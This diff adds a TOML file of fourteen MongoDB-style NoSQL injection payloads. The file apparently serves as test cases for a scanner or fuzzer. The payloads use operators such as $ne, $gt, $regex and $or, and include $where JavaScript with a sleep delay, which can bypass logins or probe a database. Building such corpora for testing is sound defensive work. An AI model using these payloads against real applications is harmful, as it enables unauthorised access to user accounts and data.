@@ -1,0 +1,72 @@
+schema = 1
+# MongoDB-flavored NoSQL injection.
+
+[[case]]
+id = "param_ne_one"
+class = "nosql"
+payload = "[$ne]=1"
+
+[[case]]
+id = "param_gt_empty"
+class = "nosql"
+payload = "[$gt]="
+
+[[case]]
+id = "param_regex_any"
+class = "nosql"
+payload = "[$regex]=.*"
+
+[[case]]
+id = "param_where_self"
+class = "nosql"
+payload = "[$where]=this.a==this.a"
+
+[[case]]
+id = "param_where_sleep"
+class = "nosql"
+payload = "[$where]=function(){sleep(5000);return%20true}"
+
+[[case]]
+id = "param_or_empty"
+class = "nosql"
+payload = "[$or]=[{}]"
+
+[[case]]
+id = "param_in_array"
+class = "nosql"
+payload = "[$in]=[\"admin\",\"user\"]"
+
+[[case]]
+id = "param_exists"
+class = "nosql"
+payload = "[$exists]=true"
+
+[[case]]
+id = "json_or_gt"
+class = "nosql"
+payload = "{\"$or\":[{\"username\":\"admin\"},{\"username\":\"root\"}]}"
+
+[[case]]
+id = "json_ne_null"
+class = "nosql"
+payload = "{\"username\":{\"$ne\":null}}"
+
+[[case]]
+id = "json_regex_admin"
+class = "nosql"
+payload = "{\"username\":{\"$regex\":\"^adm\"}}"
+
+[[case]]
+id = "json_where_function"
+class = "nosql"
+payload = "{\"$where\":\"function(){return true;}\"}"
+
+[[case]]
+id = "json_gt_null"
+class = "nosql"
+payload = "{\"_id\":{\"$gt\":null}}"
+
+[[case]]
+id = "json_type_admin"
+class = "nosql"
+payload = "{\"username\":{\"$type\":\"string\"},\"password\":{\"$ne\":null}}"
